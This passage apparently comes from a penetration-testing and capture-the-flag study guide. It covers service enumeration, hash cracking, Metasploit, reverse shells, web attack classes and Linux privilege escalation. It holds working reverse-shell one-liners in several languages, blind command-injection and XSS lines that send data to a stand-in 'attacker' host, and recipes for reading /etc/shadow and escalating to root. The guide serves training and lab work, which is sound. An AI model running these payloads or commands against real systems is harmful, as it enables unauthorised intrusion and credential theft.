> every credential pair, and lets you attack `wp-login.php` directly instead of
> guessing usernames.

### 9.3 SMB — ports 139/445

```bash
smbclient -L //target/ -N                     # list shares, null session
smbclient //target/sharename -N               # connect; then: ls, get, cd
smbmap -H target                              # shares + your permissions on each
enum4linux -a target                          # users, groups, shares, password policy
crackmapexec smb target --shares              # modern, fast, scriptable
rpcclient -U '' -N target                     # then: enumdomusers, enumdomgroups
```

Look first for **anonymous/null access** — it is the most common finding. Then
check every share for backup files, configs, `web.config`, `.kdbx`, SSH keys.

### 9.4 NFS — ports 111 + 2049

```bash
showmount -e target                                      # what is exported, to whom?
sudo nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls target
sudo mkdir /mnt/t && sudo mount -t nfs target:/export /mnt/t
cat /etc/exports   # (read it through any LFI you have)
```

The critical strings in an export line:

- `*` — **exported to everyone.** No authentication exists in NFS; access is by
  IP and UID.
- `rw` — you can write. Combined with an LFI this becomes **code execution**.
- **`no_root_squash`** — client root is honoured as target root. This alone is a
  full compromise: write a root-owned SUID binary or an SSH key.

### 9.5 FTP — port 21

```bash
ftp target          # then: anonymous / (blank password)
# or in one shot:
curl -s ftp://anonymous:@target/
wget -r ftp://anonymous:@target/
nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
```

Always try **`anonymous`** with an empty password first. If writable (`put`
works), you can often upload a web shell into a directory the web server serves.

### 9.6 SMTP — port 25

```bash
nc target 25
VRFY michael          # does this user exist?
EXPN admin            # expand a mailing list
```

Modern servers disable `VRFY`; if so, `smtp-user-enum` or a Hydra
`smtp-vrfy`/`smtp-enum` run does the same thing at scale.

### 9.7 SNMP — port 161/UDP

```bash
snmpwalk -v2c -c public target           # the whole MIB tree
snmp-check target                        # friendlier output
onesixtyone target -c /usr/share/doc/onesixtyone/dict.txt
```

Default communities are `public` (read) and `private` (read-write). SNMP leaks
running processes, installed software, user lists and sometimes config files.

### 9.8 MySQL — port 3306

```bash
mysql -u root -h target                       # empty password?
mysql -u root -p'R@v3nSecurity' -h 127.0.0.1  # reuse creds from wp-config.php
nmap -p3306 --script mysql-empty-password,mysql-databases target
```

```sql
SHOW DATABASES;
USE wordpress;
SHOW TABLES;
SELECT ID,user_login,user_pass,user_email FROM wp_users;
SELECT post_title,post_content FROM wp_posts;   -- flags hide here
```

> MySQL is very often bound to `127.0.0.1`. An external scan will never see it —
> but once you have a shell, `ss -tulnp` will, and the credentials are sitting in
> `wp-config.php` in cleartext.

### 9.9 SSH — port 22

```bash
ssh user@target
ssh -i keyfile user@target
sshpass -p 'password' ssh user@target      # scriptable
nc target 22                               # read the banner: OpenSSH version
```

Enumerate the **version string** and search it. Check for **key reuse** — a
private key found anywhere on a box is worth trying against every user on every
other host. If you find an encrypted key, `ssh2john keyfile > key.hash` then
crack it.

---

## 10. Encoding vs hashing vs encryption

These three are conflated constantly, and the confusion costs hours.

| | **Encoding** | **Hashing** | **Encryption** |
| --- | --- | --- | --- |
| Purpose | Represent data in a different *format* | Prove integrity / store passwords | Provide *confidentiality* |
| Reversible? | **Yes, trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
| Key needed? | No | No | **Yes** |
| Examples | base64, hex, URL-encoding, ROT13, uuencode, binary | MD5, SHA-256, bcrypt, phpass, yescrypt | AES, RSA, ChaCha20 |
| Security value | **Zero** | Depends entirely on the algorithm | Depends on the key |

### 10.1 Identifying base64

```text
YWFydGk6YWFydGlAZ21haWwuY29t        <- base64
```

Three tells, all reliable:
1. Character set is only `A–Z a–z 0–9 + /`, optionally with trailing `=` or `==`.
2. **Length is a multiple of 4.**
3. It is not a fixed-length digest and has no `$2b$`/`$1$`/`$6$` prefix.

```bash
echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
```

```text
aarti:aarti@gmail.com
```

> **Base64 is not a secret.** It exists so binary data survives text-only
> transport (email attachments, HTTP headers, JSON). Seeing it protecting a
> password is a finding, not a defence. **Always check whether it is nested** —
> decode, then test whether the *result* is itself base64. Some boxes chain two or
> three layers.

### 10.2 Identifying hashes

| Prefix / shape | Algorithm | Cracks with |
| --- | --- | --- |
| 32 hex chars | **MD5** | john `raw-md5`, hashcat `-m 0` |
| 40 hex chars | **SHA-1** | john `raw-sha1`, hashcat `-m 100` |
| 64 hex chars | SHA-256 | hashcat `-m 1400` |
| 128 hex chars | SHA-512 | hashcat `-m 1700` |
| `$1$salt$…` | **MD5-crypt** (22 chars after last `$`) | john `md5crypt`, hashcat `-m 500` |
| `$2a$`/`$2b$`/`$2y$` | **bcrypt** | john `bcrypt`, hashcat `-m 3200` |
| `$5$…` | SHA-256-crypt | hashcat `-m 7400` |
| `$6$…` | **SHA-512-crypt** — modern Linux default | john `sha512crypt`, hashcat `-m 1800` |
| `$y$…` | **yescrypt** — Ubuntu 22.04+ default | john `crypt` |
| `$P$…` / `$H$…` | **phpass** — WordPress, Drupal, phpBB | john `phpass`, hashcat `-m 400` |
| `$apr1$…` | Apache MD5 (`.htpasswd`) | john `hdaa` |
| 32 hex `:` username | NTLM (`user:hash` from Windows) | hashcat `-m 1000` |
| `sha1$salt$…` | Django | hashcat `-m 124` |
| `pbkdf2_sha256$…` | Django ≥1.4 | hashcat `-m 10000` |

**Generate a hash yourself to verify one** — never trust a hash copied from a
blog post:

```bash
openssl passwd -1 -salt ignite pass123      # MD5-crypt, $1$
openssl passwd -6 -salt ignite pass123      # SHA-512-crypt, $6$
python3 -c "import crypt; print(crypt.crypt('pass123','\$1\$ignite'))"
htpasswd -nb admin password                 # Apache .htpasswd style
```

> ⚠️ **The most common self-inflicted failure in this whole repository.** People
> copy a hash out of a writeup and then spend an hour debugging
> `Authentication failure`. Hashes are version- and salt-dependent. **Always
> regenerate.** And check the length: an MD5-crypt hash has exactly **22**
> characters after the final `$`. If it has 21, the source has a typo.

### 10.3 URL encoding and hex

```bash
python3 -c "import urllib.parse as u; print(u.quote(\"bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'\"))"
```

```text
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F1234%200%3E%261%27
```

**Why you must URL-encode payloads:** in a URL, `&` separates query parameters,
`#` starts a fragment, `+` means space and `>` is illegal. A reverse shell
containing all of those will be mangled by the HTTP layer before PHP ever sees
it. Percent-encoding makes it survive.

```bash
echo -n 'text' | xxd -p          # to hex     (xxd may be absent; use od -An -tx1)
echo '74657874' | xxd -r -p      # from hex
printf '%b' '\x74\x65\x78\x74'   # from hex, no xxd needed
```

---

## 11. Finding and using exploits

### 11.1 The identifiers

- **CVE** — *Common Vulnerabilities and Exposures*. A stable ID for one
  vulnerability: `CVE-2014-6271` is Shellshock. Search it at
  <https://nvd.nist.gov/vuln/search> or <https://cve.mitre.org/>.
- **CVSS** — a 0.0–10.0 severity score. Useful for prioritising, **not** for
  deciding exploitability. A CVSS 9.8 that requires physical access is less
  useful to you than a 5.3 reachable over HTTP.
- **EDB / Exploit-DB ID** — a numbered public proof-of-concept: `EDB-1518`.
  Referenced everywhere as "exploit-db.com/exploits/1518".
- **OSVDB / BID / MSF** — older advisory identifiers you will still see cited.

### 11.2 `searchsploit`

`searchsploit` is a **local, offline** search of the Exploit-DB archive shipped
with Kali. Offline matters — it works mid-engagement with no internet.

```bash
searchsploit wordpress 4.8                  # search titles
searchsploit -t apache 2.4                  # -t: search titles only (fewer false hits)
searchsploit -m php/webapps/37596.py        # -m: mirror (copy) it to your cwd
searchsploit -x php/webapps/41006.txt       # -x: examine (print) it
searchsploit -p 41006                       # -p: show the full path
searchsploit --update                       # refresh the local database
```

> **Read the exploit before you run it.** This is non-negotiable, for three
> reasons: (1) many Exploit-DB entries are *unverified* and some are outright
> malicious to the person running them; (2) you need to know which parameters to
> change (`RHOST`, `LHOST`, target path, offsets); (3) understanding it is the
> entire point of the exercise. `searchsploit -x <id>` and read.

### 11.3 Metasploit

```bash
sudo msfdb init            # first run only — initialises Postgres
msfconsole -q              # -q: skip the banner
```

```text
msf6 > search wp_reflexgallery          # find modules
msf6 > use exploit/unix/webapp/wp_reflexgallery_file_upload
msf6 > info                              # READ THIS — describes options & caveats
msf6 > show options                      # what must be set?
msf6 > set RHOSTS 192.168.56.101
msf6 > set TARGETURI /wordpress          # CMS lives in a subdir — set this or get 404s
msf6 > set LHOST 192.168.56.10           # YOUR IP, for reverse payloads
msf6 > set LPORT 4444
msf6 > show payloads                     # what can I pair with this?
msf6 > exploit
```

Session management:

```text
msf6 > sessions -l            # list
msf6 > sessions -i 1          # interact with session 1
msf6 > sessions -u 1          # upgrade a dumb shell to meterpreter
meterpreter > shell           # drop to a plain system shell
meterpreter > sysinfo / getuid / ps / download / upload
```

> **`TARGETURI` and `LHOST` are the two options people get wrong most often.**
> `TARGETURI` must include any subdirectory the app lives in (`/wordpress`,
> `/joomla`, `/webdav`). `LHOST` must be your IP **on the lab interface** — not
> `127.0.0.1`, and not your NAT address. Check with `ip -br a`.

### 11.4 GTFOBins

<https://gtfobins.github.io/> documents which ordinary Unix binaries can be
abused to escalate privileges when they are SUID, sudo-able, or run by a
scheduler. It is organised by *capability*: shell, file upload, file download,
file read, file write, command execution, reverse shell, bind shell, SUID, sudo.

```bash
# Found: (ALL) NOPASSWD: /usr/bin/watch  → look it up
#   https://gtfobins.github.io/gtfobins/watch/#sudo
sudo watch -x sh -c 'reset; exec sh'
```

> **Do not invent payloads.** If you find a SUID or `sudo` binary, look it up on
> GTFOBins. It is maintained, tested, and explains *why* each line works. Windows
> equivalent: **LOLBAS** (<https://lolbas-project.github.io/>).

### 11.5 Automated local enumeration

```bash
./linpeas.sh -a 2>/dev/null | tee linpeas.txt   # Linux — extremely thorough
./linux-smart-enumeration.sh                     # interactive, question-driven
pspy64 -pf                                       # watch processes WITHOUT root — finds cron jobs that run as root
```

> **`pspy` deserves special mention.** It reads `/proc` in a tight loop, so it
> sees processes started by *other users* — including root cron jobs that run
> every 5 seconds and never appear in `/etc/crontab`. It has won more CTF boxes
> than almost any other single tool. Run it and wait 60 seconds.
>
> **Do not trust automated tools blindly.** They produce hundreds of lines, most
> irrelevant. Use them to *find candidates*, then verify each one manually.

---

## 12. Shells — bind, reverse, and TTYs

### 12.1 Bind vs reverse

| | **Bind shell** | **Reverse shell** |
| --- | --- | --- |
| Who listens? | **The target** opens a port and waits | **You** open a port and wait |
| Who connects? | You connect to the target | The target connects to you |
| Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
| Practical? | Rarely — servers filter inbound | **Almost always** — outbound is usually permitted |

**This is why reverse shells dominate.** Egress filtering is far less common than
ingress filtering; a web server that cannot make outbound connections cannot
fetch updates, call APIs, or reach its database.

```bash
# Kali — listener
nc -lvnp 4444
```

`-l` listen · `-v` verbose · `-n` no DNS resolution (faster) · `-p 4444` port.
Use a port **above 1024** so you do not need root, and check nothing else is
using it (`ss -tulnp | grep 4444`).

### 12.2 Reverse shell payloads

```bash
# Bash — the /dev/tcp trick (bash-specific, not POSIX sh)
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.56.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat, two dialects — try both, they differ by build
nc -e /bin/sh 192.168.56.10 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("192.168.56.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="192.168.56.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Generate one for any platform
msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
```

Kali ships ready-made shells: **`/usr/share/webshells/`** has `php/`, `perl/`,
`asp/`, `jsp/` variants. The PHP one is the most-used:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.56.10';/" shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" shell.php
grep -nE '^\$(ip|port)' shell.php    # VERIFY before uploading
```

> The `>& /dev/tcp/…` payload is what the "0>&1" tail is about: `>&` redirects
> stdout and stderr to the TCP socket, and `0>&1` redirects stdin to the same
> place, so you get an *interactive* shell rather than one that only prints.

A full catalogue with escaping variants:
**PayloadsAllTheThings — Reverse Shell Cheat Sheet**
<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>

### 12.3 Upgrading to a real TTY — do this immediately

A raw `nc` shell is crippled: no tab completion, no arrow keys, `Ctrl+C` kills
your *listener* instead of the remote process, and anything needing a terminal
(`su`, `sudo`, `vim`, `top`, `less`) fails with
`standard input must be a tty`.

```bash
# On the target
python3 -c 'import pty; pty.spawn("/bin/bash")'
#   (older boxes: python -c ... ; or: script -q /dev/null -c /bin/bash)

# Press Ctrl+Z  (suspends the nc job on Kali)

# On Kali
stty raw -echo; fg
#   then, optionally, match your terminal size:
stty size                       # prints e.g. "40 160"
# on target: stty rows 40 cols 160

# On the target
export TERM=xterm
export SHELL=bash
```

What each step did:

- `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves
  like a real teletype. This is what makes `sudo` and `vim` work.
- `stty raw -echo` puts **your local** terminal into raw mode: keystrokes pass
  through uninterpreted and are not echoed locally (the remote side echoes them).
  This is what makes `Ctrl+C` reach the remote process.
- `fg` resumes the suspended `nc` job.
- `stty rows/cols` tells the remote pty your real dimensions so `less` and `top`
  do not wrap into garbage.

Verify:

```bash
id; echo $TERM; stty size
```

---

## 13. Web application attack classes

### 13.1 SQL injection (SQLi)

The application builds a SQL query by **concatenating your input**:

```php
$query = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
```

Supply `admin' -- ` and the query becomes:

```sql
SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
```

`-- ` starts a SQL comment (in MySQL, **the trailing space is required**), so the
password check is deleted. You are logged in as admin without a password.

**Detection:** insert `'`, `"`, `` ` ``, `)`, or `--` and watch for a database
error, a changed page length, or a different status code.

**Payload shapes:**

```text
' OR 1=1 --           classic tautology
' OR '1'='1           string-context tautology
" OR 1=1 #            MySQL alternate comment
admin'--              identity bypass
1' UNION SELECT 1,2,3 --   determine the column count, then extract data
1' UNION SELECT user_login,user_pass,3 FROM wp_users --   dump a table
'; WAITFOR DELAY '0:0:5' --   blind/time-based confirmation (MSSQL)
```

**Automating:**

```bash
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D wordpress --tables
sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
sqlmap -r request.txt --forms --batch --level 3 --risk 2   # from a saved Burp request
sqlmap -u "http://target/login.php" --data="user=a&pass=b" --technique=B
```

> **`sqlmap` is a tool, not a substitute for understanding.** If it fails, the
> reason is usually that you have not told it where the injectable parameter is,
> that authentication is required (`--cookie=`), or that the injection is
> second-order. Learn to confirm injection manually with a `'` first — it takes
> ten seconds and tells you whether `sqlmap` has anything to work with.

### 13.2 Local File Inclusion (LFI)

```php
include($_GET['page']);      // you control a filesystem path
```

```text
?page=/etc/passwd
?page=../../../../etc/passwd
?page=/var/log/apache2/access.log        # log poisoning
?page=php://filter/convert.base64-encode/resource=index.php   # read SOURCE, not output
?page=php://input&data=<?php system('id');?>                  # code via stdin
?page=expect://id                                             # if PECL expect is loaded
?page=/proc/self/environ
?page=/var/lib/php/sessions/sess_<your-phpsessid>             # session poisoning
```

**The `php://filter` wrapper is the one to memorise.** A plain `?page=index.php`
*executes* the script; the filter wrapper returns it **base64-encoded**, so you
can read the source and find the real vulnerability. That is how you recover
`wp-config.php`, `configuration.php`, `.env` and `config/database.php`.

### 13.3 Remote File Inclusion (RFI)

```text
?page=http://attacker/shell.txt
```

Requires **`allow_url_include = 1`** in `php.ini` — off by default since PHP 5.2.
Check it via any exposed `phpinfo()` page. If RFI fails, the error message will
usually say `http:// wrapper is disabled`, which tells you to switch to LFI plus
a local-write primitive (NFS, session files, log poisoning).

### 13.4 Command injection

The application passes your input to a shell:

```php
system("ping -c 4 " . $_GET['host']);
```

Break out with shell metacharacters:

```text
; id            sequential
| id            pipe stdout
|| id           run only if the first FAILED
& id            background
&& id           run only if the first SUCCEEDED
`id`            command substitution
$(id)           command substitution (preferred, nestable)
%0a id          newline (when the app strips ; and |)
```

**Blind** command injection gives no output. Exfiltrate instead:

```bash
$(curl http://attacker/$(whoami))          # data in the URL
$(nslookup $(whoami).attacker.com)         # data in DNS — works through most egress rules
; sleep 10                                 # timing oracle
```

### 13.5 File upload

The goal is to get a file **into a directory the web server executes**. Defences
and their bypasses:

| Defence | Bypass |
| --- | --- |
| Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
| MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is client-controlled and worthless |
| `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
| Randomised filename | Predict the scheme (`md5(name.rand())`), or read the response body — many apps echo the stored path |
| Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
| Double extension stripped | `shell.php.png` where the app strips the last extension |

### 13.6 Cross-Site Scripting (XSS)

Injecting JavaScript that runs **in another user's browser**, with their session.

- **Reflected** — payload is in the URL, echoed straight back. Needs the victim to
  click a link.
- **Stored** — payload is saved (a comment, a profile field) and runs for every
  visitor. Much more dangerous.
- **DOM-based** — the server never sees the payload; client-side JS puts it into
  the page unsafely.

```html
<script>alert(document.domain)</script>
<script>fetch('http://attacker/?c='+document.cookie)</script>
"><img src=x onerror=alert(1)>          <!-- breaks out of an attribute -->
javascript:alert(1)                      <!-- in an href -->
```

> **Why XSS matters in a lab:** stealing an administrator's session cookie is a
> complete account takeover without a password. On a CMS box, that is equivalent
> to RCE, because admins can edit templates.

### 13.7 CSRF

The site performs a sensitive action based only on "your session cookie was
present," without verifying that *you* deliberately initiated it.

```html
<form method="post" action="http://target/wp-admin/admin-ajax.php">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="action"   value="loginGuestFacebook">
  <input type="submit" value="Login">
</form>
```

The defence is a **nonce** — a per-session, unpredictable token bound to the
form, which an attacker's page cannot know. Its absence is the vulnerability.

> CSRF can be far worse than "make a user click a button." In WP Support Plus
> 7.1.3 (EDB 41006), the vulnerable action called `wp_set_auth_cookie()` on a
> username taken straight from the POST body **with no password check** — so an
> *anonymous* attacker could log in as any user.

### 13.8 SSRF

You make the **server** issue a request on your behalf, reaching hosts you cannot:

```text
?url=http://169.254.169.254/latest/meta-data/     # AWS metadata → IAM credentials
?url=http://127.0.0.1:6379/                        # internal Redis
?url=file:///etc/passwd                            # local file read
?url=http://192.168.1.1/admin                      # internal admin panel
```

Cloud metadata endpoints (`169.254.169.254`) are the highest-value SSRF target in
existence.

### 13.9 Insecure deserialisation

The application turns untrusted bytes back into **objects**. If the class has a
"magic method" that runs on construction/destruction (`__wakeup`, `__destruct` in
PHP; `readObject` in Java; `__reduce__` in Python), an attacker-supplied object
executes code.

Signatures to recognise:

| Ecosystem | Marker |
| --- | --- |
| PHP `serialize()` | `O:4:"User":2:{s:4:"name";...}` |
| **PHP `node-serialize`** | **`_$$ND_FUNC$$_`** (note the doubled `$$`) |
| Java native | `AC ED 00 05` (hex) / `rO0AB` (base64) |
| Python pickle | `\x80\x04\x95` / base64 `gASV…` |
| .NET | `AAEAAAD/////` |
| Ruby Marshal | `\x04\x08` |

### 13.10 Authentication bypass checklist

```text
1. Default credentials      (admin:admin, root:root, ubnt:ubnt, guest:guest)
2. Empty password
3. Username = password
4. Registration open?       (/register, /signup, /wp-login.php?action=register)
5. Password reset flaws     (predictable token, host-header injection)
6. IDOR                     (change ?id=1 to ?id=2)
7. Forced browsing          (skip the login; request /admin/dashboard directly)
8. JWT attacks              (alg:none, weak HMAC secret, kid injection)
9. SQLi in the login form
10. Cookie tampering        (isAdmin=false → true; role=user → role=admin)
```

---

## 14. Password cracking

### 14.1 The model

A password hash is a **one-way** function. You cannot invert it. You can only
*guess and check*: hash a candidate, compare to the target. Cracking speed is
therefore measured in guesses per second, and the defence is to make each guess
expensive.

| Algorithm | Speed on a modern GPU | Verdict |
| --- | --- | --- |
| MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
| MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
| **bcrypt** (`$2b$`) | ~20k/sec | Acceptable; cost factor tunable |
| SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
| **phpass** (`$P$`) | ~5k/sec | Deliberately slow (8192 MD5 rounds) |
| **yescrypt** (`$y$`) | ~3k/sec | Modern Ubuntu default |
| Argon2id | ~1k/sec | Current best practice |

### 14.2 John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                     # display already-cracked results
john --format=phpass --wordlist=rockyou.txt hash.txt   # force a format
john --incremental --format=raw-md5 hash.txt           # brute force
john --rules --wordlist=rockyou.txt hash.txt           # apply mangling rules
unshadow /etc/passwd /etc/shadow > combined.txt        # prepare Linux hashes
zip2john secret.zip > zip.hash                         # extract a hash from a container
ssh2john id_rsa > key.hash
pdf2john file.pdf > pdf.hash
rar2john file.rar > rar.hash
keepass2john vault.kdbx > kdbx.hash
```

> **John auto-detects formats, but not always correctly.** If it reports `No
> password hashes loaded`, specify `--format=` explicitly. `john --list=formats`
> shows every format it knows.

### 14.3 Hashcat

```bash
hashcat -m 0   -a 0 hash.txt rockyou.txt      # MD5, straight wordlist
hashcat -m 1800 -a 0 hash.txt rockyou.txt     # sha512crypt ($6$)
hashcat -m 500  -a 0 hash.txt rockyou.txt     # md5crypt ($1$)
hashcat -m 400  -a 0 hash.txt rockyou.txt     # phpass ($P$) — WordPress
hashcat -m 3200 -a 0 hash.txt rockyou.txt     # bcrypt ($2b$)
hashcat -m 1000 -a 0 hash.txt rockyou.txt     # NTLM
hashcat -m 160  -a 0 hash.txt rockyou.txt     # sha1($pass.$salt) — Joomla

# attack modes (-a)
-a 0   straight wordlist
-a 1   combination (every pair from two lists)
-a 3   mask / brute force
-a 6   wordlist + mask appended
-a 9   association rules

# masks
hashcat -m 0 -a 3 hash.txt '?l?l?l?l?l?l'          # 6 lowercase
hashcat -m 0 -a 3 hash.txt '?u?l?l?l?l?d?d'        # Capital + 4 lower + 2 digits
# ?l lower  ?u upper  ?d digit  ?s special  ?a any  ?b 0x00-0xff
```

`hashcat --help | grep -i <something>` finds the mode number. Modes are listed at
<https://hashcat.net/wiki/doku.php?id=example_hashes>.

### 14.4 Beyond the wordlist

```bash
# Rules — mangling (capitalise, append digits, leetspeak)
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Targeted wordlist from the site itself
cewl -d 3 -m 4 --with-numbers -w custom.txt http://target/

# Personal details
python3 cupp.py -i
```

> **Rules are the highest-return upgrade to a failed crack.** `best64.rule`
> applies 64 common transformations to each word — capitalisation, appending
> `1`, `123`, `!`, `2024`, leetspeak. A wordlist that fails outright very often
> succeeds with `-r best64.rule` at 64× the cost. Try it before giving up.

---

## 15. Linux privilege escalation

You have a shell as `www-data` or some low-privilege user. The goal is `root`.
Work through this list **in order** — it is arranged from fastest to slowest.

### 15.1 Orient yourself

```bash
id; whoami; hostname
uname -a; cat /etc/os-release
sudo -l                                     # ← the single highest-value command
find / -name flag*.txt -o -name proof.txt -o -name root.txt 2>/dev/null
```

> **`sudo -l` first, always.** A surprising fraction of boxes are solved by one
> line of its output. It costs nothing.

### 15.2 `sudo` rights

```text
User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```

Parse it precisely:

| Token | Meaning |
| --- | --- |
| `(ALL)` | May run as **any** user, including root |
| `(root)` | Only as root |
| `(ALL:ALL)` | Any user *and* any group |
| `NOPASSWD:` | No password will be prompted |
| `/usr/bin/python` | Absolute path — must be exactly this file |
| `/usr/bin/python *` | Any arguments allowed |
| `/usr/bin/python -m *` | Only these arguments |

Look it up on **GTFOBins**. The patterns that matter:

```bash
# Can it run a shell?
sudo bash; sudo sh; sudo /bin/bash
# Can it run an interpreter?
sudo python -c 'import pty; pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/sh";'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
# Can it read/write files? (→ overwrite /etc/passwd)
sudo cp /tmp/passwd /etc/passwd
sudo tee /etc/passwd < /tmp/passwd
sudo vim -c ':!sh'
sudo less /etc/passwd        # then !sh
# Can it escape to a shell from a pager/editor?
sudo man man                 # then !sh
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
# Is there a PATH-hijackable call inside a sudo-able script?
sudo -u#-1 command           # CVE-2019-14287 (Baron Samedit family)
sudoedit /etc/exports        # then add no_root_squash
```

Also check **`sudo` version bugs**:

```bash
sudo -V | head -1
# CVE-2019-14287 (< 1.8.28): sudo -u#-1 /bin/bash
# CVE-2021-3156 "Baron Samedit" (< 1.9.5p2): heap overflow in sudoedit
```

### 15.3 SUID binaries

**SUID** (*set-user-ID*) is a permission bit that makes a program run with the
privileges of the **file's owner**, not the caller. `/usr/bin/passwd` is
SUID-root so ordinary users can change their own password — it needs to write
`/etc/shadow`, which you cannot.

When a *powerful* binary is SUID-root, that power is yours:

```bash
find / -perm -u=s -type f 2>/dev/null         # user-SUID bit set
find / -perm -4000 -type f 2>/dev/null        # octal equivalent
find / -perm /6000 -type f 2>/dev/null        # SUID *or* SGID
ls -la /usr/bin/somebinary                    # look for -rwsr-xr-x  (the 's')
```

> **Read the permission string.** `-rwsr-xr-x` — the `s` in the *owner's* execute
> position is SUID. `-rwxr-sr-x` (lowercase `s` in the group position) is SGID.
> **`-rws` with a capital `S`** means SUID is set but the owner has *no* execute
> permission — usually a misconfiguration, and still often exploitable.

Compare against the **stock baseline** so the odd ones jump out:

```text
Normal on Ubuntu/Debian:            Suspicious when SUID:
/bin/mount  /bin/su  /bin/umount    cp  mv  wget  curl  tar  zip  unzip
/bin/ping   /usr/bin/passwd         find  vim  nano  less  more  man
/usr/bin/chfn  /usr/bin/chsh        python  perl  ruby  php  lua  node
/usr/bin/newgrp  /usr/bin/gpasswd   awk  sed  env  bash  sh  gdb  strace
/usr/lib/openssh/ssh-keysign        nmap  tcpdump  rsync  dd  make  git
/usr/lib/eject/dmcrypt-get-device   tail  head  cat  strings  xxd  od  sqlite3
/usr/sbin/pppd                      mysql  psql  ftp  ssh  scp  nc
/usr/bin/traceroute6.iputils        apt  apt-get  dpkg  rpm  snap
```

Anything in the right column that appears in your `find` output is your
escalation. Check it on GTFOBins → **SUID** section:

```bash
# e.g. SUID tail  → read /etc/shadow you normally cannot
/usr/bin/tail -n +1 /etc/shadow
# e.g. SUID php → keep privileges
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# e.g. SUID find
/usr/bin/find . -exec /bin/sh -p \; -quit
```

> `-p` on the spawned shell means **privileged** — do not drop the effective UID.
> Without it, `bash` resets its euid to the real uid as a safety measure and you
> end up back where you started. This trips up nearly everyone the first time.

### 15.4 File capabilities

A **finer-grained** alternative to SUID. Instead of "all of root", a capability is
one specific privilege — and `getcap` finds them.

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/tar cap_dac_read_search=ep
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/python3.8 cap_setuid=ep
```

| Capability | Grants |
| --- | --- |
| `cap_setuid` | **Change your UID → set it to 0 → instant root** |
| `cap_setgid` | Change your GID |
| `cap_dac_read_search` | **Read any file**, bypassing permissions |
| `cap_dac_override` | Write any file, bypassing permissions |
| `cap_chown` | Change any file's owner |
| `cap_sys_admin` | Broad — mounts, namespaces, many escapes |
| `cap_net_raw` | Craft raw packets (spoofing) |

```bash
# cap_setuid → root in one line
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# cap_dac_read_search → read anything
/usr/bin/tar -cf /tmp/shadow.tar --absolute-names /etc/shadow
tar -xOf /tmp/shadow.tar
```

> **Capabilities are the most-missed privesc vector** because `find -perm -u=s`
> does not show them. Always run `getcap -r /` as well.

### 15.5 Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
sudo crontab -l
ls -la /var/spool/cron/crontabs/
grep -r CRON /var/log/syslog 2>/dev/null | tail -30
```

Three exploitable patterns:

1. **The script itself is writable** → append `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`.
2. **The script calls a binary by relative name** (`service`, `curl`, `python`) →
   **PATH hijack**: create `~/evil/service` containing your payload, then
   `export PATH=~/evil:$PATH`. Cron's `secure_path` may block this — check
   `/etc/crontab`'s `PATH=` line.
3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
   named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`.

> **Cron jobs run by root that do not appear in `/etc/crontab` are common.** Use
> **`pspy`** to catch them: it polls `/proc` and shows processes from *all* users
> without needing root.
>
> ```bash
> ./pspy64 -pf
> # watch for: root running /opt/script.py every 5 seconds
> ```

### 15.6 Writable files and directories

```bash
